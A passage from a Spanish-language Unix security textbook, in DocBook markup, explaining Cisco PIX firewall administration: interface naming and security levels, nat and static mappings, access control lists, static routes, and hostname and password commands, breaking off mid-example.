&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;toggle&#x00A0;Unicast&#x00A0;Reverse&#x00A0;Path&#x00A0;Forwarding&#x00A0;on&#x00A0;an&#x00A0;interface.
&#x00A0;kill&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Terminate&#x00A0;a&#x00A0;telnet&#x00A0;session
&#x00A0;link&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;This&#x00A0;command&#x00A0;is&#x00A0;deprecated.&#x00A0;See&#x00A0;ipsec,&#x00A0;isakmp,&#x00A0;map,&#x00A0;ca&#x00A0;commands
&#x00A0;linkpath&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;This&#x00A0;command&#x00A0;is&#x00A0;deprecated.&#x00A0;See&#x00A0;ipsec,&#x00A0;isakmp,&#x00A0;map,&#x00A0;ca&#x00A0;commands
&#x00A0;logging&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Enable&#x00A0;logging&#x00A0;facility
&#x00A0;map&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Configure&#x00A0;IPsec&#x00A0;crypto&#x00A0;map
&#x00A0;mtu&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Specify&#x00A0;MTU(Maximum&#x00A0;Transmission&#x00A0;Unit)&#x00A0;for&#x00A0;an&#x00A0;interface
&#x00A0;name&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Associate&#x00A0;a&#x00A0;name&#x00A0;with&#x00A0;an&#x00A0;IP&#x00A0;address
&#x00A0;nameif&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Assign&#x00A0;a&#x00A0;name&#x00A0;to&#x00A0;an&#x00A0;interface
&#x00A0;names&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Enable,&#x00A0;disable&#x00A0;or&#x00A0;display&#x00A0;IP&#x00A0;address&#x00A0;to&#x00A0;name&#x00A0;conversion
&#x00A0;nat&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Associate&#x00A0;a&#x00A0;network&#x00A0;with&#x00A0;a&#x00A0;pool&#x00A0;of&#x00A0;global&#x00A0;IP&#x00A0;addresses
&#x00A0;outbound&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Create&#x00A0;an&#x00A0;outbound&#x00A0;access&#x00A0;list
&#x00A0;pager&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Control&#x00A0;page&#x00A0;length&#x00A0;for&#x00A0;pagination
&#x00A0;passwd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Change&#x00A0;Telnet&#x00A0;console&#x00A0;access&#x00A0;password
&#x00A0;ping&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Test&#x00A0;connectivity&#x00A0;from&#x00A0;specified&#x00A0;interface&#x00A0;to&#x00A0;&#x003C;ip&#x003E;
&#x00A0;quit&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Disable,&#x00A0;end&#x00A0;configuration&#x00A0;or&#x00A0;logout

&#x00A0;radius-server&#x00A0;&#x00A0;&#x00A0;Specify&#x00A0;a&#x00A0;RADIUS&#x00A0;aaa&#x00A0;server
&#x00A0;reload&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Halt&#x00A0;and&#x00A0;reload&#x00A0;system
&#x00A0;rip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Broadcast&#x00A0;default&#x00A0;route&#x00A0;or&#x00A0;passive&#x00A0;RIP
&#x00A0;route&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Enter&#x00A0;a&#x00A0;static&#x00A0;route&#x00A0;for&#x00A0;an&#x00A0;interface
&#x00A0;session&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Access&#x00A0;an&#x00A0;internal&#x00A0;AccessPro&#x00A0;router&#x00A0;console
&#x00A0;snmp-server&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Provide&#x00A0;SNMP&#x00A0;and&#x00A0;event&#x00A0;information
&#x00A0;sysopt&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Set&#x00A0;system&#x00A0;functional&#x00A0;option
&#x00A0;static&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Map&#x00A0;a&#x00A0;higher&#x00A0;security&#x00A0;level&#x00A0;host&#x00A0;address&#x00A0;to&#x00A0;global&#x00A0;address
&#x00A0;tacacs-server&#x00A0;&#x00A0;&#x00A0;Specify&#x00A0;a&#x00A0;TACACS+&#x00A0;server
&#x00A0;telnet&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Add&#x00A0;telnet&#x00A0;access&#x00A0;to&#x00A0;PIX&#x00A0;console&#x00A0;and&#x00A0;set&#x00A0;idle&#x00A0;timeout
&#x00A0;terminal&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Set&#x00A0;terminal&#x00A0;line&#x00A0;parameters
&#x00A0;tftp-server&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Specify&#x00A0;default&#x00A0;TFTP&#x00A0;server&#x00A0;address&#x00A0;and&#x00A0;directory
&#x00A0;timeout&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Set&#x00A0;the&#x00A0;maximum&#x00A0;idle&#x00A0;times
&#x00A0;url-cache&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Enable&#x00A0;URL&#x00A0;caching
&#x00A0;url-server&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Specify&#x00A0;a&#x00A0;URL&#x00A0;filter&#x00A0;server
&#x00A0;virtual&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Set&#x00A0;address&#x00A0;for&#x00A0;authentication&#x00A0;virtual&#x00A0;servers
&#x00A0;who&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Show&#x00A0;active&#x00A0;administration&#x00A0;sessions&#x00A0;on&#x00A0;PIX
&#x00A0;write&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Write&#x00A0;config&#x00A0;to&#x00A0;net,&#x00A0;flash,&#x00A0;floppy,&#x00A0;or&#x00A0;terminal,&#x00A0;or&#x00A0;erase&#x00A0;flash
&#x00A0;dixie(config)#
</literallayout>
<!--l. 1275--><para>
  </para></section><!--end subsection--><!--l. 1275--><section 
role="subsection"><title><abbrev role="title-mark">16.4.3</abbrev><anchor 
   id="x1-26200016.4.3"  ></anchor>Interfaces de red</title>
<!--l. 1276--><para>  Cisco denomina a cada uno de sus interfaces hardware de la forma ethernetN o token-ringN. Desde el
modo con&#xFB01;guraci&#x00F3;n podemos asignarles nombres simb&#x00F3;licos y niveles de seguridad, teniendo en cuenta que el
nombre outside se asigna por defecto a la tarjeta ethernet0 y el nombre inside a la ethernet1. Adem&#x00E1;s,
el nivel de seguridad de la interfaz outside ha de ser el m&#x00E1;s bajo, 0, y el reservado para inside el m&#x00E1;s
elevado, 100; el resto de tarjetas pueden tener cualquier n&#x00FA;mero comprendido entre los dos
anteriores.
<!--br/-->
<!--br/-->Si queremos asignarle un nombre simb&#x00F3;lico y un nivel de seguridad a un interfaz hemos de utilizar la orden
nameif; por ejemplo, para denominar dmz a la tarjeta ethernet2, y darle un nivel 50, ejecutar&#x02CA;&#x0131;amos lo
siguiente <anchor 
   id="x1-262001f3"  ></anchor><footnote><para>     El par&#x00E1;metro e2 es una abreviatura para ethernet2, que tambi&#x00E9;n podr&#x02CA;&#x0131;a abreviarse como ether2.</para></footnote>:

     </para><literallayout role="verbatim">
&#x00A0;dixie(config)#&#x00A0;nameif&#x00A0;e2&#x00A0;dmz&#x00A0;security50
&#x00A0;dixie(config)#
</literallayout>
<!--l. 1295--><para>Es muy importante que exista una interfaza llamada outside con un nivel 0 y una inside con un nivel
100; si alguna de las dos no existe, o si est&#x00E1; duplicada, el cortafuegos parar&#x00E1; todo el tr&#x00E1;&#xFB01;co que pase por
&#x00E9;l. Podemos ver si la con&#xFB01;guraci&#x00F3;n actual de las interfaces es correcta mediante la orden show
nameif:

     </para><literallayout role="verbatim">
&#x00A0;dixie(config)#&#x00A0;show&#x00A0;nameif
&#x00A0;nameif&#x00A0;ethernet0&#x00A0;outside&#x00A0;security0
&#x00A0;nameif&#x00A0;ethernet1&#x00A0;inside&#x00A0;security100
&#x00A0;nameif&#x00A0;ethernet2&#x00A0;dmz&#x00A0;security50
&#x00A0;nameif&#x00A0;ethernet3&#x00A0;intf3&#x00A0;security15
&#x00A0;dixie(config)#
</literallayout>
<!--l. 1310--><para>
  </para></section><!--end subsection--><!--l. 1310--><section 
role="subsection"><title><abbrev role="title-mark">16.4.4</abbrev><anchor 
   id="x1-26300016.4.4"  ></anchor>Accesos entre interfaces</title>
<!--l. 1311--><para>  Para conseguir excepciones a las reglas de funcionamiento del adaptive security algorithm se utilizan los
comandos nat y static; la orden nat permite que una interfaz de mayor seguridad pueda acceder a uno de
menor, mientras que static hace justo lo contrario.
<!--br/-->
<!--br/-->Para cada interfaz de mayor nivel de seguridad que quiera acceder a una de menor nivel hemos de ejecutar
la orden nat:

     </para><literallayout role="verbatim">
&#x00A0;dixie(config)#&#x00A0;nat&#x00A0;(dmz)&#x00A0;0&#x00A0;0.0.0.0&#x00A0;0.0.0.0
&#x00A0;dixie(config)#&#x00A0;sh&#x00A0;nat
&#x00A0;nat&#x00A0;(dmz)&#x00A0;0&#x00A0;0.0.0.0&#x00A0;0.0.0.0&#x00A0;0&#x00A0;0
&#x00A0;pixie(config)#
</literallayout>
<!--l. 1325--><para>La orden anterior indica que el interfaz dmz acceder&#x00E1; sin realizar NAT (el primer &#x2018;0&#x2019;), aplicando esto a todas
las m&#x00E1;quinas de la subred conectada a ese interfaz: los dos grupos &#x2018;0.0.0.0&#x2019; representan la direcci&#x00F3;n y la
subred, respectivamente, de los equipos a los que permitimos la salida; si s&#x00F3;lo quisi&#x00E9;ramos que una de las
m&#x00E1;quinas conectada al interfaz dmz accediera a segmentos de menor prioridad, pondr&#x02CA;&#x0131;amos su direcci&#x00F3;n IP y
su m&#x00E1;scara (255.255.255.255).
<!--br/-->
<!--br/-->Si lo que queremos es permitir el acceso desde un interfaz de menor nivel de seguridad a uno de mayor
ejecutaremos la orden static, que tiene la sintaxis siguiente:
</para><section role="center"><title/>
<!--l. 1335--><para> static (if<informalequation><graphic 
fileref="unixsec306x.gif"></graphic></informalequation>interna,if<informalequation><graphic 
fileref="unixsec307x.gif"></graphic></informalequation>externa) dir<informalequation><graphic 
fileref="unixsec308x.gif"></graphic></informalequation>destino dir<informalequation><graphic 
fileref="unixsec309x.gif"></graphic></informalequation>destino netmask mascara</para></section>
<!--l. 1339--><para>El hecho de que aparezca por duplicado la direcci&#x00F3;n destino de la m&#x00E1;quina que estamos &#x2018;publicando&#x2019; al exterior
es porque, al ejecutar la orden nat, hemos decidido no hacer NAT real; si lo estuvi&#x00E9;ramos haciendo, en lugar
de la direcci&#x00F3;n destino utilizar&#x02CA;&#x0131;amos en primer lugar la direcci&#x00F3;n que le damos a la m&#x00E1;quina hacia el exterior
(t&#x02CA;&#x0131;picamente, una IP p&#x00FA;blica) y en segundo la direcci&#x00F3;n que tiene el equipo dentro de la red a la que est&#x00E1;
directamente conectado (una privada).
<!--br/-->
<!--br/-->De esta forma, si lo que queremos es que desde toda Internet (interfaz outside) se pueda acceder a
nuestro servidor de correo POP3, en la m&#x00E1;quina 158.42.22.41 (por ejemplo, dentro del interfaz dmz),
ejecutar&#x02CA;&#x0131;amos en primer lugar la siguiente orden:

     </para><literallayout role="verbatim">
&#x00A0;dixie(config)#&#x00A0;static&#x00A0;(dmz,outside)&#x00A0;158.42.22.41&#x00A0;158.42.22.41
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;netmask&#x00A0;255.255.255.255
&#x00A0;dixie(config)#&#x00A0;sh&#x00A0;static
&#x00A0;static&#x00A0;(dmz,outside)&#x00A0;158.42.22.41&#x00A0;158.42.22.41&#x00A0;netmask&#x00A0;255.255.255.255&#x00A0;0&#x00A0;0
&#x00A0;dixie(config)#
</literallayout>
<!--l. 1359--><para>Con el comando anterior nos limitamos a &#x2018;publicar&#x2019; la direcci&#x00F3;n de una m&#x00E1;quina protegida por el PIX &#xFB01;rewall
al resto de Internet; pero esto no signi&#xFB01;ca que ya se pueda acceder a ese sistema: tras la orden static, es
necesario habilitar listas de control de acceso a los diferentes servicios de la direcci&#x00F3;n que hemos publicado,
y asociar dichas listas de control a la interfaz correspondiente; si por ejemplo el acceso necesitado es SMTP,
ejecutar&#x02CA;&#x0131;amos la siguiente orden:

     </para><literallayout role="verbatim">
&#x00A0;dixie(config)#&#x00A0;access-list&#x00A0;prueba&#x00A0;permit&#x00A0;tcp&#x00A0;any&#x00A0;host&#x00A0;158.42.22.41
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;eq&#x00A0;smtp
&#x00A0;dixie(config)#&#x00A0;access-group&#x00A0;prueba&#x00A0;in&#x00A0;interface&#x00A0;outside
&#x00A0;dixie(config)#
</literallayout>
<!--l. 1374--><para>Como vemos, asociamos la lista de control a la interfaz de entrada del tr&#x00E1;&#xFB01;co, no a la que est&#x00E1;
conectada la m&#x00E1;quina. El tema de las listas de control de acceso es el que vamos a ver en el punto
siguiente.
  </para></section><!--end subsection--><!--l. 1377--><section 
role="subsection"><title><abbrev role="title-mark">16.4.5</abbrev><anchor 
   id="x1-26400016.4.5"  ></anchor>Listas de control de acceso</title>
<!--l. 1378--><para>  Como acabamos de decir, para acceder a determinados servicios de una m&#x00E1;quina, una vez hemos dejado
establecer las conexiones entre interfaces, es necesario de&#xFB01;nir permisos sobre el modo de acceso, el origen y
los servicios a los que se permite acceder de esa m&#x00E1;quina; esto lo conseguiremos mediante la orden
access-list, cuya sintaxis es la siguiente:
</para><section role="center"><title/>
<!--l. 1383--><para> access-list ID accion proto dir-origen pto-origen dir-destino pto-destino</para></section>
<!--l. 1386--><para>Si por ejemplo queremos habilitar un acceso HTTP desde cualquier lugar de Internet, y adem&#x00E1;s acceso POP3
desde un determinado segmento externo (por ejemplo, 196.33.22.128/25) a la m&#x00E1;quina 158.42.22.41, lo
haremos mediante una lista de control de dos entradas (que llamaremos prova), que podemos crear con las
siguientes &#x00F3;rdenes:

     </para><literallayout role="verbatim">
&#x00A0;pixie(config)#&#x00A0;access-list&#x00A0;prova&#x00A0;permit&#x00A0;tcp&#x00A0;any&#x00A0;host&#x00A0;158.42.22.41&#x00A0;eq&#x00A0;http
&#x00A0;pixie(config)#&#x00A0;access-list&#x00A0;prova&#x00A0;permit&#x00A0;tcp&#x00A0;196.33.22.128&#x00A0;255.255.255.128
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;host&#x00A0;158.42.22.41&#x00A0;eq&#x00A0;http
&#x00A0;pixie(config)#
</literallayout>
<!--l. 1399--><para>Dentro de una lista de control es importante asegurarse que la regla m&#x00E1;s general es siempre la &#x00FA;ltima; PIX
funciona en este sentido como Firewall&#x2013;1: en el momento en que una determinada regla hace match, se
aplica y no se sigue analizando el resto. Por ejemplo, si queremos que ning&#x00FA;n equipo del exterior haga ping
a la m&#x00E1;quina 158.42.22.41, excepto los que provienen de la red 196.72.31.0/24, de&#xFB01;niremos la siguiente lista
de control de acceso:

     </para><literallayout role="verbatim">
&#x00A0;pixie(config)#&#x00A0;access-list&#x00A0;prova&#x00A0;permit&#x00A0;icmp&#x00A0;196.72.31.0&#x00A0;255.255.255.0&#x00A0;host
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;158.42.22.41
&#x00A0;pixie(config)#&#x00A0;access-list&#x00A0;prova&#x00A0;deny&#x00A0;icmp&#x00A0;any&#x00A0;any
&#x00A0;pixie(config)#
</literallayout>
<!--l. 1414--><para>Con las &#x00F3;rdenes anteriores no hacemos m&#x00E1;s que de&#xFB01;nir (o modi&#xFB01;car, si ya exist&#x02CA;&#x0131;a) la ACL &#x2018;prova&#x2019;; esto no
tiene ning&#x00FA;n efecto sobre el funcionamiento del cortafuegos, ya que para que lo tenga tenemos que asociar
esta lista a una interfaz de red: en concreto, a aquella de la que va a provenir el tr&#x00E1;&#xFB01;co de entrada en cada
caso. Para ello, utilizaremos la orden access-group:

     </para><literallayout role="verbatim">
&#x00A0;pixie(config)#&#x00A0;access-group&#x00A0;prova&#x00A0;in&#x00A0;interface&#x00A0;outside
&#x00A0;pixie(config)#
</literallayout>
<!--l. 1426--><para>Con este comando asociamos la lista de control a la interfaz especi&#xFB01;cada; si esta interfaz ya ten&#x02CA;&#x0131;a asociada
una lista de control, la nueva reemplaza a la antigua pero las conexiones no se pierden, ni siquiera las
que estaban permitidas anteriormente pero ahora se niegan. Esto es &#x00FA;til para poder a~nadir entradas
intermedias a las listas de control sin que las conexiones establecidas por el interfaz al que queremos
asociarlas se pierdan: para ello, lo m&#x00E1;s r&#x00E1;pido es copiar la lista en un editor de textos, realizar
sobre el mismo las modi&#xFB01;caciones necesarias, y grabarla de nuevo en el cortafuegos con otro
nombre; tras esto, la asociamos al interfaz correspondiente mediante access-group, y cuando
estemos seguros de que todo funciona correctamente la grabamos en memoria mediante write
mem.
<!--br/-->
<!--br/-->Si lo que queremos es a~nadir una entrada al &#xFB01;nal de la lista de control no es necesario todo esto: basta con
ejecutar el access-list correspondiente para que la nueva entrada se a~nada a la lista, y
autom&#x00E1;ticamente se aplique sobre el interfaz; si no queremos a~nadir, sino eliminar entradas de una ACL,
podemos ejecutar directamente no access-list, orden que recibe como par&#x00E1;metro la entrada a
eliminar:

     </para><literallayout role="verbatim">
&#x00A0;pixie(config)#&#x00A0;sh&#x00A0;access-list&#x00A0;prova
&#x00A0;access-list&#x00A0;prova&#x00A0;permit&#x00A0;tcp&#x00A0;any&#x00A0;host&#x00A0;158.42.22.41&#x00A0;eq&#x00A0;smtp&#x00A0;(hitcnt=0)
&#x00A0;access-list&#x00A0;prova&#x00A0;permit&#x00A0;tcp&#x00A0;any&#x00A0;host&#x00A0;158.42.22.41&#x00A0;eq&#x00A0;pop3&#x00A0;(hitcnt=0)
&#x00A0;access-list&#x00A0;prova&#x00A0;permit&#x00A0;tcp&#x00A0;any&#x00A0;host&#x00A0;158.42.22.41&#x00A0;eq&#x00A0;telnet&#x00A0;(hitcnt=0)
&#x00A0;pixie(config)#&#x00A0;no&#x00A0;access-list&#x00A0;prova&#x00A0;permit&#x00A0;tcp&#x00A0;any&#x00A0;host&#x00A0;158.42.22.41&#x00A0;eq&#x00A0;pop3
&#x00A0;pixie(config)#&#x00A0;sh&#x00A0;access-list&#x00A0;prova
&#x00A0;access-list&#x00A0;prova&#x00A0;permit&#x00A0;tcp&#x00A0;any&#x00A0;host&#x00A0;158.42.22.41&#x00A0;eq&#x00A0;smtp&#x00A0;(hitcnt=0)
&#x00A0;access-list&#x00A0;prova&#x00A0;permit&#x00A0;tcp&#x00A0;any&#x00A0;host&#x00A0;158.42.22.41&#x00A0;eq&#x00A0;telnet&#x00A0;(hitcnt=0)
&#x00A0;pixie(config)#
</literallayout>
<!--l. 1457--><para>Como siempre, una vez que estemos seguros de que la con&#xFB01;guraci&#x00F3;n es correcta, ser&#x00E1; necesario grabar los
cambios en memoria &#xFB02;ash mediante write mem.
  </para></section><!--end subsection--><!--l. 1460--><section 
role="subsection"><title><abbrev role="title-mark">16.4.6</abbrev><anchor 
   id="x1-26500016.4.6"  ></anchor>Rutado</title>
<!--l. 1461--><para>  En el cortafuegos PIX es necesario especi&#xFB01;car mediante rutas est&#x00E1;ticas c&#x00F3;mo vamos a encaminar los
paquetes que nos llegan, a~nadiendo una ruta para cada red conectada a un interfaz; s&#x00F3;lo podremos asignar
una ruta por defecto, asociada siempre al interfaz outside.
<!--br/-->
<!--br/-->Para ver las rutas del &#xFB01;rewall utilizaremos la orden sh route:

     </para><literallayout role="verbatim">
&#x00A0;pixie(config)#&#x00A0;sh&#x00A0;route
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;outside&#x00A0;0.0.0.0&#x00A0;0.0.0.0&#x00A0;172.17.1.3&#x00A0;1&#x00A0;OTHER&#x00A0;static
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inside&#x00A0;172.17.2.0&#x00A0;255.255.255.0&#x00A0;172.17.2.1&#x00A0;1&#x00A0;CONNECT&#x00A0;static
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;dmz&#x00A0;192.168.63.0&#x00A0;255.255.255.0&#x00A0;192.168.63.156&#x00A0;1&#x00A0;CONNECT&#x00A0;static
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;failover&#x00A0;192.168.87.208&#x00A0;255.255.255.252&#x00A0;192.168.87.209&#x00A0;1&#x00A0;CONNECT
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;static
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;dmz&#x00A0;158.42.0.0&#x00A0;255.255.0.0&#x00A0;192.168.63.156&#x00A0;1&#x00A0;OTHER&#x00A0;static
&#x00A0;pixie(config)#
</literallayout>
<!--l. 1478--><para>Como vemos, la ruta por defecto est&#x00E1; asociada a la interfaz outside; adem&#x00E1;s, la interfaz dmz tiene dos rutas,
una para una clase p&#x00FA;blica y otra para una privada, y tambi&#x00E9;n existe una boca del &#xFB01;rewall dedicada en
exclusiva al failover, del que hablaremos m&#x00E1;s adelante.
<!--br/-->
<!--br/-->Si lo que queremos es modi&#xFB01;car cualquiera de estas rutas, a~nadir rutas nuevas, o eliminar alguna de ellas,
ejecutaremos la orden route, cuya sintaxis es la siguiente:
</para><section role="center"><title/>
<!--l. 1485--><para> route interfaz direccion-remota mascara gateway metrica</para></section>
<!--l. 1488--><para>Por ejemplo, si deseamos enrutar el tr&#x00E1;&#xFB01;co dirigido a la red 192.168.63.128/25 a trav&#x00E9;s del interfaz dmz, que
tiene como direcci&#x00F3;n IP 192.168.63.156, y que est&#x00E1; directamente conectado a la red (un salto), ejecutar&#x02CA;&#x0131;amos
esta orden:

     </para><literallayout role="verbatim">
&#x00A0;pixie(config)#&#x00A0;route&#x00A0;dmz&#x00A0;192.168.63.128&#x00A0;255.255.255.128&#x00A0;192.168.63.156&#x00A0;1
&#x00A0;pixie(config)#
</literallayout>
<!--l. 1498--><para>Para eliminar una ruta, ejecutaremos el comando no route, que recibe como par&#x00E1;metro la ruta que deseamos
eliminar (algo similar a lo que suced&#x02CA;&#x0131;a con las listas de control de acceso).
  </para></section><!--end subsection--><!--l. 1501--><section 
role="subsection"><title><abbrev role="title-mark">16.4.7</abbrev><anchor 
   id="x1-26600016.4.7"  ></anchor>Otras &#x00F3;rdenes &#x00FA;tiles</title>
<!--l. 1502--><para>
  </para><!--l. 1502--><section 
role="subsubsection"><title><anchor 
   id="x1-26700016.4.7"  ></anchor>Arranque y parada del cortafuegos</title>
<!--l. 1503--><para>  La orden reload (modo privilegiado) reinicia el &#xFB01;rewall y carga su con&#xFB01;guraci&#x00F3;n, bien desde diskette
bien desde la memoria &#xFB02;ash (en caso de que no haya ning&#x00FA;n disco en la unidad). Al ejecutar
reload se nos pedir&#x00E1; con&#xFB01;rmaci&#x00F3;n para reiniciar el cortafuegos, y es muy importante que
en caso de no querer ejecutar el comando tecleemos &#x2018;n&#x2019;; cualquier otra respuesta ejecuta la
orden.
  </para></section><!--end subsubsection--><!--l. 1507--><section 
role="subsubsection"><title><anchor 
   id="x1-26800016.4.7"  ></anchor>Con&#xFB01;guraciones del sistema</title>
<!--l. 1508--><para>  <informalequation><graphic 
fileref="unixsec310x.gif"></graphic></informalequation> Nombre de la m&#x00E1;quina
<!--br/-->Mediante la orden hostname cambiamos el nombre de host del cortafuegos:

     </para><literallayout role="verbatim">
&#x00A0;dixie(config)#&#x00A0;hostname&#x00A0;pixie
&#x00A0;pixie(config)#&#x00A0;hostname&#x00A0;dixie
&#x00A0;dixie(config)#
</literallayout>
<!--l. 1518--><para>  <informalequation><graphic 
fileref="unixsec311x.gif"></graphic></informalequation> Contrase~nas
<!--br/-->En modo con&#xFB01;guraci&#x00F3;n podemos cambiar la contrase~na de acceso al modo privilegiado mediante
la orden enable password; mediante show enable vemos la cadena cifrada con nuestra
contrase~na:

     </para><literallayout role="verbatim">
&#x00A0;dixie(config)#&#x00A0;show&#x00A0;enable
&#x00A0;enable&#x00A0;password&#x00A0;/hVDnFhQPQc4lzN5&#x00A0;encrypted
&#x00A0;dixie(config)#&#x00A0;enable&#x00A0;password&#x00A0;passprova
&#x00A0;dixie(config)#&#x00A0;show&#x00A0;enable
&#x00A0;enable&#x00A0;password&#x00A0;S6KVLr8BjSKx8os/&#x00A0;encrypted
&#x00A0;dixie(config)#
</literallayout>
<!--l. 1531--><para>Esta clave es diferente de la que se utiliza para acceder al cortafuegos v&#x02CA;&#x0131;a telnet; para modi&#xFB01;car esta &#x00FA;ltima
(por defecto ser&#x00E1; &#x2018;cisco&#x2019;) utilizaremos la orden passwd, y para visualizar la cadena cifrada resultante
show passwd:

     </para><literallayout role="verbatim">
&#x00A0;dixie(config)#&#x00A0;show&#x00A0;passwd
&#x00A0;passwd&#x00A0;2KFQnbNIdI.2KYOU&#x00A0;encrypted
&#x00A0;dixie(config)#&#x00A0;passwd&#x00A0;prova
&#x00A0;dixie(config)#&#x00A0;show&#x00A0;passwd
&#x00A0;passwd&#x00A0;/hVDnFhQPQc4lzN5&#x00A0;encrypted
&#x00A0;dixie(config)#
</literallayout>
<!--l. 1543--><para>Si quisi&#x00E9;ramos restaurar esta contrase~na a su valor original (&#x2018;cisco&#x2019;), no tenemos m&#x00E1;s que ejecutar la orden
clear passwd:

     </para><literallayout role="verbatim">
&#x00A0;dixie(config)#&#x00A0;show&#x00A0;passwd
&#x00A0;passwd&#x00A0;/hVDnFhQPQc4lzN5&#x00A0;encrypted
&#x00A0;dixie(config)#&#x00A0;clear&#x00A0;passwd
&#x00A0;dixie(config)#&#x00A0;show&#x00A0;passwd
